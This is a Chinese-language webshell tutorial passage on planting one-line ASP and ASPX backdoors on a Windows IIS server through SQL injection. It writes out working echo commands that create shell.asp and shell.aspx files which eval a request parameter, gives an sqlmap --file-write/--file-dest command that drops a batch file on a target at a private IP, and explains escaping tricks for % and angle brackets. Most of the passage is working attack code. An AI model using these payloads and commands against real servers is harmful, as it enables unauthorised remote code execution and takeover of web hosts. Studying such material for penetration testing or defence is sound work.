我们先在本地创建一个用于写一句话木马的批处理文件，不过得将该文件编码改为ANSI或GB2312（默认UTF-8），因为xp_cmdshell调用的cmd.exe命令终端的编码是GBK。
Default
写ASP一句话：
echo ^<%eval request("xxxasec")%^> >C:\inetpub\wwwroot\中文测试\shell.asp
 
写ASPX一句话：
echo ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["xxxasec"],"unsafe");%^> > C:\inetpub\wwwroot\中文测试\shell.aspx

接着再利用sqlmap –file-write、–file-dest参数或者Windows自带的certutil等程序将这个写马批处理文件落地到目标磁盘中
Default
sqlmap -u "http://192.168.56.102/sql.aspx?id=1" --batch --file-write /tmp/shell.bat -file-dest C:\\ProgramData\\shell.bat

再用type看下文件中的中文字符已经没有乱码了，但是在执行这个批处理文件写马时又出现了一点问题。
%与批处理不兼容的问题，其实就是一句话木马中的%……%被批处理当作行间注释了，不能出现>重定向符号和|管道符号，这时我们可以用两个%百分号来解决这个问题。
Default
写ASP一句话：
echo ^<%%eval request("xxxasec")%%^> >C:\inetpub\wwwroot\中文测试\shell.asp
 
写ASPX一句话：
echo ^<%%@ Page Language="Jscript"%%^>^<%%eval(Request.Item["xxxasec"],"unsafe");%%^> > C:\inetpub\wwwroot\中文测试\shell.aspx

将以上进行转义过的写一句话木马的批处理文件再次通过sqlmap –file-write、–file-dest的方式上传至目标磁盘中并执行。
需要注意的几个地方
Default
    命令行写Webshell时得在<>尖括号前用^转义：^<^>；
 
    批处理写Webshell时得在%百分号前用%转义：%%1%%2；
 
    sqlmap --file-write、--file-dest写入文件时路径得用\\双斜杠；